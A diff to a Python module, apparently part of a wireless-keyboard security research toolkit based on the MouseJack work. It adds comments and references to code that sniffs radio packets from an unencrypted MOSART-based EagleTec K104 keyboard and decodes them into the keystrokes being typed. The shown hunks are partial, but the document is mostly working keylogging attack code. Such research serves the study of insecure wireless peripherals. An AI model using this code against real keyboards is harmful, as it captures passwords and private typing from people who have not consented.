@@ -1,19 +1,39 @@
+"""
+This file contains the functionalities required for keylogging the unencrypted EagleTec K104 keyboard,
+which uses a MOSART transceiver rather than nRF24.
+This implementation could theoretically support any MOSART-based product, as the MouseJack whitepaper states
+that there is likely no vendor-specific customization.
+
+References:
+1. Section 8 (MOSART) in the MouseJack whitepaper
+2. KeySniffer project: https://github.com/BastilleResearch/keysniffer/blob/master/tools/mosart-device-discovery.py
+3. Slides 53-72 of the following presentation describe the reverse engineering process of a MOSART-based mouse:
+   https://repo.zenk-security.com/Conferences/HITB/D1%20COMMSEC%20-%20Marc%20Newlin%20-%20Applying%20Regulatory%20Data%20to%20IoT%20RF%20Reverse%20Engineering.pdf
+4. Mirage Framework documentation and relevant source code:
+   https://homepages.laas.fr/rcayre/mirage-documentation/mosartstack.html
+   https://github.com/RCayre/mirage/tree/master/mirage/libs/mosart_utils
+"""
+
 import time
 from pynput.keyboard import Controller, Listener, Key, KeyCode
 from ..hid_scan_codes import *
 from ..general_utils import *
 
-CHANNEL = 26
-RF_RATE_1M = 1
-POSTAMBLE = 0xFF
-PACKET_LEN = 10
-WHITENING_BYTE = 0x5A
+# constants
+CHANNEL = 26 # the channel at which the keyboard and dongle camp (constantly remain on)
+RF_RATE_1M = 1 # the data rate of the MOSART transceiver is 1Mbps (the value 1 is for another reason - it's the ordinal of this rate in the "enum" of data rates defined at nrf24.py)
+POSTAMBLE = 0xFF # the last byte of a MOSART keypress packet
+PACKET_LEN = 10 # expected length of a MOSART keypress packet, not including the preamble
+WHITENING_BYTE = 0x5A # the fields are XOR-ed with this value before the packet is transmitted over the air by the keyboard
 KEY_STATE_DOWN = 0x81
 KEY_STATE_UP = 0x01
 KEYPRESS_FRAME_TYPE = 0x07
 
-message = ""
+message = "" # message printed to the screen when a key is pressed/released
 
+# MOSART has its own unique keyboard codes. This dictionary maps them to values that are compatible with pynput.
+# We need this because 
+# Based on: https://github.com/RCayre/mirage/blob/master/mirage/libs/mosart_utils/keyboard_codes.py#L29, plus manual sniffing
 eagletec_codes = {
     0x08: Key.pause,
     0x0C: Key.ctrl_r,
@@ -121,22 +141,28 @@ eagletec_codes = {
     0x92: Key.cmd_r,
 }
 
-def get_key_name(key):
+def get_key_name(key): # key is a Key/KeyCode object of pynput.keyboard
     try:
-        if key.char:
+        if key.char: # if the key is a character, simply return it
             return key.char
+        
+        # Handling keypad keys, which are defined using KeyCode objects. We have a dedicated dictionary to get their names,
+        # but we can't use the "key" parameter to directly access the dictionary, since it holds a different KeyCode reference than the one stored there.
+        # So we iterate over the dictionary until we find a KeyCode with the same vk.
         for k in list(pynput_dict.keys()):
             if isinstance(k, KeyCode) and key.vk == k.vk:
                 return pynput_dict[k]
-    except AttributeError:
-        return pynput_dict[key]
+    except AttributeError: # if the key doesn't have a "char" attribute, then it's a Key object (KeyCode objects do have a "char" attribute)
+        return pynput_dict[key] # this time we can directly access the dictionary, since Key objects are simply enum values
 
+# function called when the listener catches a key press (performed by the controller, in this case)
 def on_press(key):
     global message
     if message:
-        print(message + f"    key {get_key_name(key)} pressed")
-    message = ""
+        print(message + f"    key {get_key_name(key)} pressed") # print the message along with the identified key
+    message = "" # so that no message is printed if the user on this PC presses a key (which is caught by the listener)
 
+# function called when the listener catches a key release (performed by the controller, in this case)
 def on_release(key):
     global message
     if message:
@@ -144,20 +170,26 @@ def on_release(key):
     message = ""
 
 def sniff(radio, address, duration):
+    """
+    This function receives a radio parameter (can either be a RadioServer for remote communication, or nrf24 for local usage),
+    the duration of the sniffing proccess (in seconds), and the known address of an EagleTec keyboard.
+    It performs sniffing and keylogging of the EagleTec K104 keyboard - printing received packets and identified key for each packet.
+    """
     global message
-    address_prefix = address[::-1]
+    address_prefix = address[::-1] # we get the address in little endian like usually required, but here it needs to be big endian 
     radio.enter_promiscuous_mode_generic(address_prefix, RF_RATE_1M)
     radio.set_channel(CHANNEL)
 
-    start_time = time.time()
+    start_time = time.time() # variable to store the time in which the sniffing process has started
 
+    # Initializing a 
     keyboard = Controller()
     listener = Listener(on_press=on_press, on_release=on_release)
     listener.start()
 
-    while time.time() - start_time < duration:
-        value = radio.receive_payload()
-        if value[0] == 0xFF:
+    while time.time() - start_time < duration: # repeating as long as the time passed since the beginning of the sniffing process has not exceeded the desired duration
+        value = radio.receive_payload() # try to receive a payload
+        if value[0] == 0xFF: # 0xFF means no payload, according to the research firmware code: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/src/radio.c#L365
             continue
 
         if POSTAMBLE in value and value.index(POSTAMBLE) == PACKET_LEN - 1:
